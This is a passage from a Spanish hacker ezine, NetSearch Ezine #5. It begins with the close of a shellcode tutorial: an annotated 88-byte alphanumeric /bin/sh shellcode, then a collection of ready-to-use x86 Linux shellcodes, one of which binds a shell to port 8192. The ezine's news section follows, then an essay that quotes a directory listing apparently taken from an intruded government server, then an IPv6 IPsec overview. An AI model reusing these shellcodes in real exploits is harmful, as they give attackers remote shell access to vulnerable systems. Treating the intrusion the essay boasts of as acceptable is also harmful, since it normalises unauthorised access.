La scode se muestra por pantalla ordenada y esop, luego solo es cuestion de
cut & paste ;).



-------------------------------
// 8.- Shellcode alfanumerica
-------------------------------


Hay algunas veces que necesitamos una scode que solo contenga valores
alfanumericos una vez 'printeada', es decir solamente letras (mayusculas,
minisculas, y numeros). Un caso muy tipico podria ser un programa 'xplotable'
donde no tuvieramos sitio para poner la scode, a excepcion de una funcion
donde tenemos sitio pero que hace chequeo de valores alfanumeros por medio de
la funcion isalnum().

La solucion obvia pasa por tener un codigo que ejecute una shell (o cualquier
otra cosa de la que saquemos provecho), y que sea capaz de pasar por un
chequeo de isalnum(). En este caso particular veremos una sc que ejecuta un
execve() de /bin/sh, pero se pueden hacer mas cosas.

Para conseguir un codigo que no tenga ningun opcode (opcode es el valor en
hexadecimal de cada intruccion en asm) no printeable, tendremos que recurrir
a ciertas artimañanas.. Para empezar la mayoria de instrucciones como xorl
%eax,%eax, movl %eax,%edx no se podran usar, asi que hay que usar 
otras. Bueno, lo mejor sera que pegue la scode y vaya comentandola brevemente
linea por linea :).

Tengo que decir que el metodo de los nops alfanumericos lo ha desarrollado
Fatuo (Fuego Fatuo - leonardo@hispasecurity.com), aparte de alguna que otra
scode alfanumerica tambien.

Dicho metodo consiste en sobreescribir %ebp con la direccion de retorno
(normalmente casi siempre se sobreescribe en los stack overflow normales), y
luego en vez de poner nops poner 'incl %ebp' -> caracter 'E'. De esta forma
se calcula la direccion de retorno exacta donde terminan los 'nops' y empieza
la shellcode. Dicha direccion hay que saberla exacta por el tema de
automodificacion de codigo que se vera mas adelante. Tambien hay otro metodo
un poco mas burro con el cual no hace falta sobreescribir %ebp, pero tiene
ciertas limitaciones como el numero de nops a poner y el tamaño. Yo tenia
desarrollada una sc con ese metodo que admitia 200 nops y tenia un tamaño de
392 bytes creo q eran.. pero hay que reconocer que mola mas este metodo asi
que hice una scode optimizada y se kedo en 88 bytes :).

Para copiar un registro a otro, al no poder usar mov's, tendremos que
hacerlo con xor's. La teoria es que si tenemos 2 valores, pongamos A y B,
haciendo lo siguiente quedaria tal que asi:

A xor B = C    (C es el resultado)
C xor A = B
C xor B = A

Veamoslo con numeros:

5 xor 2 = 7
7 xor 5 = 2
7 xor 2 = 5

Por lo tanto, si queremos copiar %eax a %edi, usaremos una memoria intermedia
que sepamos que no contiene codigo de la scode, de la siguiente forma:

xorl 0x60(%ebp) , %eax		
xorl %eax , 0x60(%ebp)   -> aqui hemos copiado %eax a la dire 0x60(%ebp)
xorl %edi , 0x60(%ebp)
xorl 0x60(%ebp) , %edi   -> ya tenemos %eax en %edi


Bueno, y ahora ya empecemos con la scode :)..


+ <dec   %esp>
. Decrementa en 1 unidad %esp.

+ <dec   %esp>
. Idem.

+ <dec   %esp>
. Idem.

+ <dec   %esp>
. Idem XD. Restamos 4 a %esp en total.

+ <popl  %eax>
. Salvamos la direccion de retorno de la funcion anterior en %eax.

+ <xorl  0x58(%ebp),%eax>
. Vamos a utilizar una direccion intermedia para copiar %eax a %esp.

+ <xorl  %eax,0x58(%ebp)>
. Ya tenemos %eax en la dire %ebp+0x58.

+ <xorl  %esp,0x58(%ebp)>
. Primer paso para copiar el contenido de %ebp+58 a %esp.

+ <xorl  0x58(%ebp),%esp>
. Ya tenemos copiado %ebp+0x58 (%eax) en %esp. Esto se hace para que no
sobreescribamos la propia shellcode cuando mas tarde hagamos unos cuantos
push's. De esta forma los push's siempre iran 'por encima' de la scode y no
habra peligro de sobreescribir nada importante.

+ <push  $0x45>
. Guardamos el valor 0x00000045 en la pila.

+ <popl  %eax>
. Ponemos %eax a 0x00000045

+ <xorb  $0x45,%al>
. Ponemos %eax a cero (0x00000000)

+ <pushl %eax>
. Ponemos un long null en la pila

+ <push  $0x68736538>
. Guardamos lo q sera parte del string '/bin/sh'

+ <popl  %eax>
. Recuperamos en %eax lo q sera parte del string '/bin/sh'

+ <xorw  $0x4a56,%ax>
. Modificamos el contenido de %ax para conseguir el string

+ <pushl %eax>
. Lo colocamos en la pila (recordemos que detras hay un long null)

+ <pushl $0x69626565>
. Segunda parte de lo que sera el string '/bin/sh'

+ <popl  %eax>
. Lo recuperamos en %eax (idem que antes)

+ <xorw  $0x4a4a,%ax>
. Lo modificamos con un xor (idem de idem)

+ <pushl %eax>
. Lo ponemos en la pila. Ahora tenemos en memoria //bin/sh0x00000000

+ <push  %esp>
. Salvamos la direccion del string

+ <popl  %ecx>
. Recuperamos la direccion del string en %ecx

+ <push  $0x59>
. Primera parte del procedimiento para poner %eax a cero

+ <popl  %eax>
. Guardamos 0x00000059 en %eax

+ <xorb  $0x59,%al>
. %eax = long null

+ <push  %eax>
. Ponemos un long null en la pila

+ <push  %ecx>
. Ponemos la dire del string en la pila

+ <push  %esp>
. Ponemos la dire del array (dire_string,null) en la pila (*argv[])

+ <push  %eax>
. Guardamos un long null en la pila

+ <push  %ebp>
. Guardamos la direccion del principio de la shellcode en la pila. Recordemos
que %ebp teoricamente contiene la dire exacta de la shellcode, ya que
sobreescribimos %ebp con la dire de retorno en el xploit, y fuimos
incrementandolo con los nops.

+ <popl  %eax>
. Recupera la direccion de la shellcode en %eax.

+ <xorl  0x58(%eax),%ecx>
. Procedimiento para mover %ecx a %ebx usando una direccion intermedia, %ecx
contiene la direccion del string '/bin/sh'.

+ <xorl  %ecx,0x58(%eax)>
. Con esto coloca %ecx en la direccion %eax+0x58 (direccion que no contiene
codigo de la scode, por lo tanto no nos importa lo que sobreescribamos).

+ <xorl  %ebx,0x58(%eax)>
. Procedimiento igual pero ahora con %ebx.

+ <xorl  0x58(%eax),%ebx>
. Copiamos el contenido de la dire %eax+0x58 a %ebx. Es decir, ya tenemos
%ecx en %ebx (la dire del string).

+ <popl  %edx>
. Recupera un long null en %edx que habiamos guardao hace mil años XD.

+ <popl  %ecx>
. Recupera la direccion del array *argv[] en %ecx que tambien habiamos
guardao hace mil años.

+ <dec   %edx>
. Decremante %edx, ahora vale 0xffffffff

+ <xorw  %dx,0x56(%ebp)>
. Procedimiento de automodificacion de codigo. Con esto conseguiremos cambiar
el byte 0x32 que esta mas abajo en memoria (dire %ebp+0x56 para ser
exactos) por 0xcd (primer byte de int $0x80). Y dejamos preparado el byte
0x47 para convertirlo con un segundo xor en 0x80.

+ <inc   %edx>
. Volvemos a poner %edx a cero.

+ <push  $0x38>
. Ponemos el byte 0x38 en la pila.

+ <popl  %eax>
. %eax = 0x00000038

+ <xorb  %al,0x57(%ebp)>
. Convertimos el byte que antes era 0x47 a 0x80, con lo que cuando se
ejecuten esos 2 bytes se ejecutara int $0x80. Hemos convertido los bytes 0x32
y 0x47 en 0xcd y 0x80 (opcodes de int $0x80).

+ <xorb  $0x33,%al>
. Ponemos %al a 0x0b (0x38 xor 0x33 = 0xb).

+ <.byte 0x32>
. Byte que sera/ha sido convertido a 0xcd

+ <.byte 0x47>
. Byte que sera/ha sido convertido a 0x80.


Y ya esta, a que no ha sido tan dificil? :). Con esto conseguimos una
shellcode alfanumerica totalmente funcional y que permite nops infinitos,
con un tamaño de 88 bytes.



-----------------------------------------------
// 9.- Recopilacion de shellcodes / extractor
-----------------------------------------------


Aqui pego una recopilacion de scodes listas para ser usadas. Para
'extraerlas': nextract archivo.txt. Por cierto que todas son made by RaiSe
(algunas como la alfanumerica compartiendo ideas con Zer0 y Fatuo ;) ).


<++> shellcodes/sc-esp.c $8308a7a77bbe3103152344e40da5df0d

// scode '%esp' sobreescrito

char shellc[128]=
"\xeb\x1f\x5f\x89\xfb\x31\xc0\x88\x47\x07\x89\x7f\x08\x89\x47"
"\x0c\x8d\x4f\x08\x8d\x57\x0c\xb0\x0b\xcd\x80\x31\xdb\x89\xd8"
"\x40\xcd\x80\xbc\xf0\xff\xff\xbf\xe8\xd7\xff\xff\xff\x2f\x62"
"\x69\x6e\x2f\x73\x68";

<-->

<++> shellcodes/sc-oneline.c $cfec37c76b30001d337f80e7eb35b206

// scode sin retornos de linea

char shellc[128]=
"\xeb\x19\x5f\x89\x7f\x10\x31\xd2\x88\x57\x07\x89\x57\x14\x89"
"\xfb\x8d\x42\x50\x8d\x4f\x10\x83\xe8\x45\xcd\x80\xe8\xe2\xff"
"\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";

<-->

<++> shellcodes/sc-mini.c $9d747e94e6be0a71682e2dd1ab6b77d8

// miniscode, 24 bytes

char shellc[128]=
"\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3"
"\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80";

<-->

<++> shellcodes/sc-portshell.c $ecba7d17930eb1b3d596b5eb21c431ce

// scode que enlaza una shell en el puerto 8192

char shellc[512]=
"\x4c\x4c\x4c\x4c\x5f\x89\xfc\x31\xc0\x89\xc3\xb0\x02\xcd\x80"
"\x39\xc3\x74\x05\x8d\x43\x01\xcd\x80\x31\xd2\x89\x57\x08\x42"
"\x89\x57\x04\x42\x89\x17\x89\xf9\x31\xdb\x43\x8d\x43\x65\xcd"
"\x80\x89\xc6\x31\xd2\x89\x17\xc6\x07\x02\xc6\x47\x02\x20\x89"
"\x57\x04\x89\x77\x08\x89\x7f\x0c\x89\x57\x10\xc6\x47\x10\x10"
"\x8d\x42\x66\x8d\x5a\x02\x8d\x4f\x08\xcd\x80\x89\x37\x89\x57"
"\x04\xc6\x47\x07\x01\x8d\x42\x66\x8d\x5a\x04\x89\xf9\xcd\x80"
"\x89\x57\x04\x89\x57\x08\x8d\x42\x66\x8d\x5a\x05\xcd\x80\x89"
"\xc3\x31\xc9\x8d\x42\x3f\xcd\x80\x8d\x42\x3f\x41\xcd\x80\x8d"
"\x42\x3f\x41\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f"
"\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80";

<-->

<++> shellcodes/sc-alfa.c $f9c01b11bf127c80454b55d2ea3525ef

// scode alfanumerica
// nop is 'E'

char shellc[128]=
"LLLLX3EX1EX1eX3eXjEX4EPh8eshXf5VJPheebiXf5JJPTYjYX4YPQTPUX"
"3HX1HX1XX3XXZYJf1UVBj8X0EW432G";

<-->

<++> shellcodes/scodes.h $7986750a103954c2ac983bee2abd34cd
// Extractor de shellcodes by RaiSe
// NetSearch Ezine
// Testeado en redhat 6.0


#define SIZE 2048

int printsc (int funcion)
{
int i,cc;
char dst[SIZE],buf[SIZE],*p;

p=(char *)funcion;
sprintf(buf,"%s",p);
p=dst;

printf("\nExtractor de shellcodes");
printf("\nRaiSe - NetSearch Ezine\nhttp://www.netsearch-ezine.com\n");

for(i=3;i<strlen(buf);i++)
	{
	sprintf(p,"%08x",buf[i]);
	*p=*(p+6);
	*(p+1)=*(p+7);
	p+=2;
	}

*p=0x00;
i=0;
printf("\nchar shellc[]=");

while(dst[i]!=0x00)
	{
	printf("\n\"");
	for(cc=0;cc<15;cc++)
		{
		if(dst[i]==0x00)  break;
		printf("\\x%c%c",dst[i],dst[i+1]);
		i+=2;
		}
	printf("\"");
	}	

printf(";\n\n");
return(1);

}

<-->


-------------------
// 10.- Despedida
-------------------


Bueno, y esto ha llegado a su fin. Como suele decirse ha sido un placer
escribirlo ;). Por desgracia no puedo mandar un saludo a mi novia porque ya
no la tengo.. cosas que pasan en la vida.. Un saludo muy especial para sp4rk,
quasar, doing, cafo & company ;).

Nos vemos en NetSearch Ezine #6, hasta pronto.


RaiSe



0x00

-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_


=-[ 0x05 ]-==================================================================
=-[ NetSearch Ezine #5 ]-====================================================
=-[ NetSearch al habla ]-====================================================
=-[ por NetSearch ]-=========================================================




Pues bien, como se me ha pasado comentarlo en la editorial, os voy a recordar
una cosilla que, sin animo de ser pesado, es fundamental. Me estoy refiriendo
a las colaboraciones.. Si estas pensando en escribir un articulo y no sabes
donde mandarlo, no lo dudes mas, editor@netsearch-ezine.com rulez ;). Solo
tiene que cumplir unos cuantos requisitos (infimos), para que sea
publicado. Estos son:


    + Estar escritos con un maximo de 77 columnas.
 
    + No usar caracteres fuera del estandar ASCII (7 bits) a excepcion de
      la eñe. Es decir, nada de acentos ;).
 
    + Siempre que el texto se base en otro ya publicado primero se consul-
      tara con el autor del mismo, y en caso de que no tenga inconveniente
      se procedera a su publicacion citando la fuente en el articulo. Lo
      mismo para una traduccion, con la particularidad de que en este caso se
      indicara claramente que se trata de una traduccion.

    + Intentar no usar formas 'raras' de expresion, algo asi como: "0la ke
      t4L? s0y Ch4CH1". Se puede pasar alguna que otra (escribir ke en vez
      de que, etc.) pero si el texto llega a ser ilegible.. chungo.


Y nada mas.. a que no es tan dificil? ;). Tambien tengo que recordaros otra
cosa.. A los que os guste tener el ezine en archivos separados (cada articulo
en un fichero), podeis conseguirlo simplemente compilando el fichero
nextract.c que acompaña al ezine y ejecutando: "nextract -s ns005.txt".

Asi mismo si quereis 'extraer' los ficheros (normalmente codigos fuente) de
un archivo del ezine simplemente hay que ejecutar el nextract de esta forma:
"nextract fichero.txt", y se crearan los ficheros correspondientes. Por
cierto que el nextract ha sido modificado por cafo para que haga la funcion
de separar el ezine en archivos (entre otras), thanks again cafo ;).

En el tema del RC5-64 seguimos igual, es decir, mal XD. Vamos los ultimos de
la liguilla entre ezines hispanos.. aun asi confiamos en que la cosa de un
vuelco de esos repentinos y nos pongamos los primeros (somos unos ilusos). La
direccion para darse de alta es http://rc5.distributed.net, y el numero de
identificacion de NetSearch el 11007.

Tambien puedes apuntarte a nuestra lista de correo (abierta y moderada).
Puede participar cualquiera, siempre que el contenido del mail tenga cierta
relacion con la tematica de la lista; seguridad informatica, hack, phreak,
etc. Para darte de alta solo tienes que ir a la direccion siguiente y cubrir
un pequeño formulario: 'http://groups.yahoo.com/subscribe/netsearch'. No te
olvides tampoco de pasarte de vez en cuando por nuestro canal del irc-hispano
#netsearch ;). Y bueno, ya que estamos de propaganda pasate tambien de vez en
cuando por nuestra web 'http://www.netsearch-ezine.com' ;D.

Cambiando de tema, hay una cosa que me ha llamado bastante la atencion. Y es
que los plagios de los articulos parece que estan de moda.. Han sido varios
casos de ezines concretos los que han involucrado a NetSearch. No voy a dar
nombres, ya que dichos ezines ya han sido avisados por email, simplemente
hacer un pequeño llamamiento a los editores para que se tenga un poco mas de
rigor a la hora de contrastar el origen de un articulo. Con esto no quiero
decir que NetSearch Ezine este libre de plagios, pero somos muy reacios a
incluir articulos de gente que no consideramos 'de confianza'. Es mas, el 90%
del ezine esta hecho por el propio Staff, con lo cual las posibilidades de
dicho plagio se reducen bastante..

Bueno, creo que ya no me queda nada mas que decir asi que me voy a ir
pirando.. Tened cuidado con esa gripe que esta pegando fuerte este mes de
febrero/marzo ;). Un saludo a todo@s.


El Editor



0x00

-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_


=-[ 0x06 ]-==================================================================
=-[ NetSearch Ezine #5 ]-====================================================
=-[ Reflexiones sobre los MIG ]-=============================================
=-[ por NEULK ]-=============================================================




18:00 horas,un dia cualquiera entre semana,  cafeteria del centro donde
el aki presente estudia...

- Diga?
* Soy Middle, nano no te puedes imaginar lo que te estoy apunto de decir.
- No se middle, tu diras...
* Vas a flipar, han pillado a Newman y ha pasado noche en el calabozo...

Y asi es como empezo un cumulo de reacciones internas, dificil de
explicar con mi triste y pobre vocabulario.

Inmediatamente me puse en contacto con todos para ver que pasaba y como
habia ocurrido todo esto. 

Efectivamente Newman habia pasado noche en el calabozo. Un chico normal,
con un trabajo serio habia sido detenido en plan pelicula de matrix y
habia pasado noche en el cuartelillo cuando aun no se habia ni confirmado
si era culpable, inocente, o la persona que en ese momento los putos mig
estaban buscando.

Muy triste...

Y es que siempre estamos igual, siempre primero las acciones y los hechos
para asegurar la justificacion de unos presupuestos destinados a una mas
que dudosa tarea de investigacion de supuestos 'delincuentes?¿?¿
hackernienses ?¿?', y luego hecho todo, cuando ya es tarde,  entonces es
cuando se mira si es correcta, acertada o justificable la accion
emprendida.

Y es que me van a perdonar todos aquellos lectores que encuentran sentido
a todo esto, pero a mi, el que les escribe, me cuesta, me cuesta mil
entender el porque se tiene que destinar un dinero (mayor o menor) a joder
a una persona que encima no ha hecho absolutamente nada de lo que se le
acusa para variar...

Y lo peor son las formas y el daño hecho. Porque claro, cuando en la
television o en medios cuya intencion es la de captar oyentes/lectores o a
fin de cuentas, clientela, se expone una noticia de este tipo, lo real, lo
humano, es de lo que se olvidan. Ahi no hay defensa, ahi no hay noticia,
eso no interesa. Ahora, claro, la investigacion de nuestros superagentes
que han pillado un hacker que no se que y me la come el no se
tal, eso si. Porque volvemos a lo de siempre...vende.

Pero el daño esta hecho, persona con trabajo estable, sin antecedentes,
chico como vuestros amigos, como el mas normal del planeta, ese si. Como
es el mas facil de todos los objetivos, ese si es 'jodible', ese
justifica el sueldo, lo que se  han gastado en investigacion. Y ahora
que?, que pasa con un curriculum que a partir de ahora esconde una
penuria, un traspies, algo dificil de entender para un jefe de
personal. Que pasa con el trabajo del inocente. Como lo recupera ahora?
quien dice ahora 'me han/estuve detenido pero soy inocente'. Que
triste...no me canso de decirlo.

A mi ahora me gustaria saber cuanto se han gastado en una investigacion de
un año. Cuanto cuesta pichar un telefono, cuanto cuesta tener agentes
noche y dia detras de una persona, cuanto cuesta todo eso... ?. Y para
que? pues señores y señoras, para nada....el dinero de todos los
contribuyentes para nada, que incomprensible perdida. 

Porque cojones no mandan ese dinero a otros sectores/departamentos/o otros
tipos de investigaciones?...joder. 

A mi, si pillan a un subnormal que tiene montada la megaempresa y es todo
pirata, pase. A mi si se cepillan al gilipollas que estafa no se
cuantos millones, pase. Pero coño, hacerlo con alguien que ni va ni viene
de todo ese tema.....vamos. Hostias, gastaros los duros con los mamones
que ponen las putas bombas!!. O mejor aun, si, eso, mucho mejor,  que tal
si os gastais el puto dinero en 'asegurar' vuestros propios servidores,
que luego uno se traga unas cosas que.....


[ Extracto censurado por todos laos que me la juego :PPPP ]

nciacti unknown 4138 982031400 264 null null
helicoptero directory 512 916934964 0 null null
imagen directory 6656 977129514 0 null null
enlace.html text/html 929 916941726 260 null null
error.html text/html 2020 916846154 264 null null
iadministracion.html text/html 3198 898246046 260 null null
icarreteras.html text/html 3400 919277214 260 null null
iindex.html text/html 4643 919800294 260 null null
ilegislacion.html text/html 2626 900664326 260 null null
carreteras directory 3584 981986707 0 null null
irevista.html text/html 3512 898186408 260 null null
legislacion.html text/html 2626 861819920 268 null null
oposiciones.html text/html 2845 913297386 264 null null
gsm.txt text/plain 6618 982031400 260 null null
notas directory 512 908869666 0 null null
camaras directory 9216 972038790 0 null null
becas directory 512 975326630 0 null null
notas2 directory 512 913297206 0 null null
boletin directory 1024 966601722 0 null null

[ fin extracto :P ]


Esto es triste. Ahi si debe ir dinero por ejemplo. Que asco. Me da
verdadero asco.... lo peor es que tenga que leer lo de  ministerio
de 'tal y tal' al final de la pagina del susodicho mierda de servidor.

Y encima no hay que hacer nada. No cuesta nada entrar. Es como el fallo de
la pagina de los mig tiempo atras. O como la de la moncloa....no es
complicado. Solo hay que jugar un poco a no ser paleto....solo eso.

Pero como bien se dice muchas veces, esto es españa, y asi somos, para lo
bueno y para lo mas garrulo.

Porque cuando nos toca ser garrulos, bien que lo somos. Y si no que se lo
pregunten a los men in blue. Que heavy es tener que ver la coleccion
entera desde el numero 1 hasta el ultimo de cierta revista que da nombre a
cierto simbolo emailistico... y encima oir cosas como, tenemos poco
presupuesto asi que nos subscribimos solo a 4 revistas del sector....
juas pues si de 4 una es esa, sin desmerecer a los que viven a costa de
ella, cuales seran las demas?. Una linux magazine sera? o a lo mejor se
han comprado todos los volumenes del TCP/IP illustrated?. No lo creo.
Porke lo que reina es la incompetencia. Una incompetencia que se extiende
a todo. Que si soplos de que cierto buque llegaria con no se cuantas
toneladas de... aire?. Que si un tio con la condicional que se folla a no
se cuantas tias.. que si no se cuantos millones robados de no se que
aereopuerto... y ahi estan ellos, demostrando de lo que mas entienden. De
incompetencia.

Claro, eso lleva ya a tecnicas insospechadas. Y alla que nos vamos al siglo
anterior. Porke claro, peliculas de indios y vaqueros si han visto. Y que
mejor que esas peliculas para obtener nuevas 'tacticas' contra los
'delincuentes'. Y muchos se preguntaran, de que habla este colgao. Pues lo
ultimo ahora es aproximadamente pagar medio millon de pesetas para el que
denuncie alguna empresa con software pirateado. Al cambio unos 4000-4500$.
Aleeee mas dineroo!, eso si, para gastarselo en formacion u otros
menesteres no. Pero para jugar a indios y vaqueros si. Y ahora voy yo,
tonto de mi, que el otro dia tuve un accidente y estuve rellenando un
parte en una comisaria y descubri cierca 'cosita' y me pregunto: 
que ocurriria si la BSA (por decir alguien) hiciera una inspeccion a las
comisarias de policia?, que ocurriria? Porque me da a mi que el numero de
serie  000-000....(y repitasen los ceros hasta el final) creo que no es
muy habitual.....creo yo vamos. Pero claro, eso solo lo veremos en alguna
pelicula futura si se hace. En fin...

Ya me enrollado bastante, ya me he desahogado bastante.... y ya os
he aburrido bastante.....

El texto, sera garrulo, sera estupido, no aportara nada, supongo que
generara algo que pensar y opiniones de todos los gustos. Bien!, eso
quiero. Que cada uno se lo plantee como quiera, que cada uno haga sus
moralejas....es mi modesta opinion y asi la he contado XD

Desde estas lineas mi mas publico apoyo al protagonista de esta
historia, que ademas de protagonista es un amigo. Un poco colgao XD, pero
un amigo en la distancia...


[ Todos los nicks del texto son ficticios ]
[ El extracto es real al 100% ]
[ Para paletos: mig -> men in green ]


Un saludo...

		NEULK 


(este nick tambien es falso, of course)



0x00

-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_


=-[ 0x07 ]-==================================================================
=-[ NetSearch Ezine #5 ]-====================================================
=-[ Seguridad en IPv6 ]-=====================================================
=-[ por MegadetH ]-==========================================================




* 1 INTRO
^^^^^^^^^^^

Desde principios de los 90 estaba claro que Internet estaba llegando a las
limitaciones de su familia de protocolos IPv4,limitaciones de
direcciones,limitaciones de seguridad,litaciones de rendimiento...,el RFC
1287 publicado en 1991 describe los propositos de actualizacion mas
importantes,decididos de unos encuentros entre algunas organizaciones como la
IAB (Internet Architectu- re Board) o la IESG (Internet Engineering stering
Group).Algunas areas en las que se centraron fueron:


-Enrutado y direccionamiento
-Arquitectura multiprotocolo
-Seguridad
-Control y estado del trafico
-Aplicaciones avanzadas sobre IP


A partir de aqui y pasando por varios proyectos que eran tenidos en cuenta
por la IETF (RFC 1347 :TUBA,RFC 1475: IP/IX,RFC 1709 :LATNIP,RFC 1710 :SIPP)
(por cierto echadles un vistazo si os aburris algun dia xDD),pos al fin se
llega al conocido hoy por IPv6 cuyo primer estandard (RFC's 1883-1887)dejo
paso al actual IPv6 en 1998 (RFC's 2373-2375++).IPv6 esta siendo ya soportado
por numerosos productos,por ejemplo la FreeBSD 4.0 lo soporta ya plenamente
en lo que se conoce como dual stack IPv4/IPv6,y el linux empieza ya a sopor-
tarlo tb,imagino k las distros basadas en el 2.4 lo haran ya plenamente.

No es mi intencion meterme a explicar paso a paso toda la familia IPv6 sino
centrarme en algunas de las caracteristicas de seguridad que posee,por cierto
que me han llamado la atencion algunas cosas de la IPv6 como por ejemplo el
que varias tarjetas de red puedan tener la misma direccion IPv6 para distri-
buir la carga hacia un server muy saturado,por ejemplo,(supongo ke las tar-
jetas de red deberan soportar esta caracteristica tb),el tema de la fragmen-
tacion de paquetes o la desaparicion de las direcciones broadcast,aunque se
podra usar un multicast "to all nodes" para casos necesarios.

Weno la verdad es que cuando uno se acostumbra a una cosa jode cambiar xDDDD
pero habra que acostumbrarse a las IP's de tipo:

1015:0:0:0:F932:FF12:48AA:1A2B/60 de 128 bits (4 bits x 4 digitos x 8 nums.)
:-))

++Nota: estos RFCs son los mas destacados pero naturalmente hay muchos mas.


* 2 IPSEC
^^^^^^^^^^^

El objetivo de IPSec es proveer de mecanismos de seguridad al IPv4 e IPv6(RFC
1825)en la capa IP,asi 2 sistemas pueden comunicarse de forma segura usando
IPsec con algoritmos y protocolos seguros,e incluso pueden negociar que algo-
ritmo sera usado para encriptar el trafico entre ambos.

Algunos de los servicios de seguridad que son parte de IPSec son :

-Control de acceso : Uso seguro de llaves permitiendo la autentificacion de
un usuario para el acceso a un sistema.

-Integridad sin conexion:Identificacion de paquetes individualmente

-Identificacion del origen de los datos mediante el uso de algoritmos de fir-
ma digital.

-Mecanismo contador de paquetes

-Encriptacion (o cifrado xDDD)

-IP Tunneling proporcionando mayor confidencialidad aun con el trafico
encriptado.

Todas estas funciones son posibles mediante el uso de la cabecera AH (Authen-
tication Header) y la cabecera ESP(Encapsulation Security Payload),IPv4 tam-
bien puede hacer uso de ellas pero su implementacion es mas facil en IPv6.

--Mas informacion sobre IPSec (como los algoritmos de encriptacion y autenti-
ficacion k usa,como se implementa como parte de IPv4 e IPv6,tunneling etc,
etc) mail me...--

Las cabeceras pueden ser usadas individualmente o juntas,si van juntas la AH
va antes k la ESP,para k se produzca la autentificacion antes k la desencrip-
tacion.


* 3 AH (Authentication Header)
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Con la AH podemos obtener las siguientes ventajas:

-Servicios de integridad para datagramas IP
-Autentificacion para datagramas IP
-"Non Repudiation" para datagramas IP
-Rechazo de paquetes con el mismo numero de secuencia ya recibidos

Puede ser usada en modo tunel o en modo transporte(es decir para proteger
trafico entre dos hosts de modo normal o para proteger un grupos entero de
data- gramas enviados hacia o por un gateway seguro,--mas sobre esto mail
me...--) Cuando es usado con otras cabeceras debe ser colocada despues de
cualkier cabecera que sea procesada en la ruta,en cualkiera de los saltos y
antes de las cabeceras que son procesadas en el destino.

En modo transporte protege el payload del datagrama original y las partes de
la cabecera k no cambian en el camino del datagrama hacia el destino. En modo
tunel es diferente,la direccion de destino original y el datagrama IP
original son encapsulados en un nuevo datagrama que es enviado al gateway se-
guro.

--No incluyo los graficos de los datagramas en este caso,ni los de las
cabeceras luego,para no hacer el arti tan largo,si a alguien le interesa
mail me.

Campos de la AH:

-Next Header:comun en todas las cabeceras Ipv6,8 bits,indica el protocolo de
la cabecera siguiente.

-Payload Lenght:8 bits,longitud de la AH en palabras de 32 bits -2.LA AH con-
siste en 64 bits de cabecera y el resto corresponde a los datos de autentifi-
cacion.

-Reserved:16 bits,por ahora todo ceros,reservado para uso futuro.

-SPI(Security Parameter Index)32 bits,Es un numero arbitrario,junto con la
direccion de destino y el protocolo de seguridad(en este caso AH)identifica
la asociacion de seguridad (SA Security Asociation : contiene una combinacion
de datos k pueden identificar una conexion con propositos de seguridad,--mas
sobre esto mail me--).Un valor de 0 significa que es para uso local y no se
transmite,los valores de 1-255 estan reservados por la IANA para su uso
futuro.

-Sequence number:32 bits,esto ya lo conocemos de la cabera TCP,aunke parece
ser k en el AH va destinado a evitar los atakes de repeticion,asi un pakete
con el numero de secuencia duplicado se descarta automaticamente.

-Authentication data:Este campo contiene el ICV (Integrity Check Value),cora-
zon de la AH,la longitud debe ser un multiplo de 32 bits,y puede ser
rellenado para ello.El ICV (ver drafts k actualizan al RFC 1826)es el
resultado de un algoritmo de autentificacion que puede ser:

-Message Authentication Codes (MACs)cuyo resultado es encriptado con un algo-
ritmo simetrico (p.e. DES)

-Funciones Hash como MD-5 o SHA-1 (de hecho debe soportar al menos ambas para
cumplir con el estandard)

--La verdad es que en criptologia y criptoanalisis no soy un experto asi ke
para mas info os remito al tio Cafo xDDD --

La Authentication Date es calculada en el datagrama IP entero y en las partes
de la cabecera IP que no pueden cambiar.


* 4 ESP (Encapsulation Security Payload)
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Esta designada para permitir enviar y recibir datagramas encriptados y espe-
cialmente para proporcionar diferentes servicios (algunos en conbinacion con
la AH)p.e.:

-Confidencialidad de datagramas a traves de la encriptacion.

-Autentificacion de los datos de origen a traves del uso de encriptacion de
clave publica.

-Confidencialidad del flujo de trafico a traves de gateways seguros.

-Descarte de paquetes con el mismo numero de secuencia ya recibidos (como en
la AH)La ESP puede ser usada con la AH,de hecho es lo recomendado y debe se-
guir a cualquier cabecera que deba ser procesada por nodos intermedios.Todos
los datos que siguen a la ESP son encriptados,de hecho los datos encriptados
aparecen como el ultimo campo de la ESP.Como la AH,puede ser usada en modo
transporte o en modo tunel,en modo transporte la cabecera IP y algunas otras
cabeceras extendidas(la ESP y la AH forman parte de las cabeceras extendidas
del IPv6 asi como las de enrutado etc etc --mas info sobre esto mail
me--)como las "routing","fragmentation" etc preceden a la AH (si esta) y
despues se situa la ESP.Si hay cabeceras a ser procesadas en el destino
pueden ir antes o despues de la ESP,si la siguen son encriptadas. Aun con
todo esto se puede analizar y estudiar el trafico entre los dos hosts.

Una alternativa es usar un gateway seguro,que puede operar directamente con
un host,o con otro gateway seguro,un host puede usar la ESP en modo tunel
para encriptar todo el trafico saliente y encapsularlo en diferentes grupos
de datagramas que son enviados al gateway seguro,que desencripta el trafico y
lo manda a sus destinos.Cuando se usan en modo tunel,la ESP encapsula el
datagrama IP entero y es una extension de la cabecera IP que dirige el
datagrama hacia el gateway seguro.

Campos de la ESP:

La cabecera ESP cambia un poco comparada con otras cabeceras IPv6,el campo
"Next Header" por ejemplo,aparece casi al final de la cabecera y no al
principio,y la cabecera que precede a la ESP especifica k le sigue una ESP
poniendo el valor 50 en su campo "Next Header".

Los campos son:

-SPI(Security Parameter Index):32 bits,igual k en la AH,es usado por los no-
dos k se comunican para referenciar una asociacion de seguridad (SA) que se
usa para determinar como se encriptaran los datos.

-Sequence number:32 bits,igual k en la AH

